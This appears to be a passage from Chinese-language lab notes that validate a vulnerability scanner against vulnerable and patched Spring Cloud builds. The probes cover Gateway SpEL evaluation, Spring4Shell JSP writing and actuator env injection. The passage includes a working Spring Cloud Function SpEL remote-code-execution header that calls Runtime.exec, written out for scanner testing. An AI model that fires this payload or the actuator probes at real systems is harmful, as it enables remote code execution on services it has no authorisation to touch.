切换命令：


## 四、手工 Ground Truth（独立于扫描器）

1. **Gateway SpEL 真求值**（无害 #{7*7}，不执行命令）：

   ```
   POST /actuator/gateway/routes/spelprobe   # AddResponseHeader value=#{7*7}
   POST /actuator/gateway/refresh
   GET  /spelprobe/probe                     # 响应头 X-Spel-Probe: 49  → SpEL 被求值
   DELETE /actuator/gateway/routes/spelprobe + POST /actuator/gateway/refresh
   ```

   安全模式（gateway 3.1.1）下该路由端点在 exposure 收敛后不可达；3.1.1 的修复本身也不再对 filter args 求值。

2. **Cloud Function SpEL 真执行命令**：

   ```
   POST /functionRouter
   header: spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","echo SCF_SPEL_RCE > <ascii-tmp-path>"})
   # 返回 500（求值结果不是已注册函数），但文件已写入 → 真实 RCE
   ```

   3.2.5 修复版同样请求不会写文件、也不会出现 4s 延迟。

3. **env 写入真生效**：POST 后 GET /actuator/env，`manager` propertySource 中出现
   `ruoyi.scan.env_probe` 与（演示用）`eureka.client.serviceUrl.defaultZone`。
   这正是 eureka xstream / Spring Cloud 配置覆盖链的前提。

4. **Spring4Shell**：--exploit 真实写入 Tomcat `webapps/ROOT/<name>.jsp`（只打印随机数字），
   轮询命中后 CONFIRMED；安全模式下同一绑定被黑名单忽略，无新 JSP 产生。
   注意：Tomcat AccessLogValve 默认 `buffered=true`，JSP 落盘会有数秒随机延迟，
   连续对拍时扫描器 15×1s 轮询可能全部落空（实测 2026-11-02 一次 UNKNOWN）。
   `scripts/c2_s4s.py` 启动时会把 server.xml 的 AccessLogValve 幂等地改成
   `buffered=false`，让「写入 → 轮询」确定性收敛；这只是刷盘时机，不改变漏洞。

## 六、备注

- C2-3 扫描比原来慢约 4s/次：这是新判定（sleep 4s 时序差分）的预期代价。
- C2-1b 的 env 探针写在内存 propertySource（`manager`），进程重启即消失，无持久副作用。
- Gateway 探针路由由扫描器新增的清理逻辑 DELETE；残留时手工执行
  `DELETE /actuator/gateway/routes/<id>` + `POST /actuator/gateway/refresh`。
- C2-2 的 `--exploit` 遗留 JSP 只打印数字，不含命令执行代码；可手工删除。
- 2026-11-02 复测：C2-1b 扫描 6.18s、C2-3 22.04s（含 4s 时序探针）、C2-2 16.66s；
  全部 6 份报告在 `ruoyi-scan/artifacts/wp3_c2_*_{vuln,safe}/`。
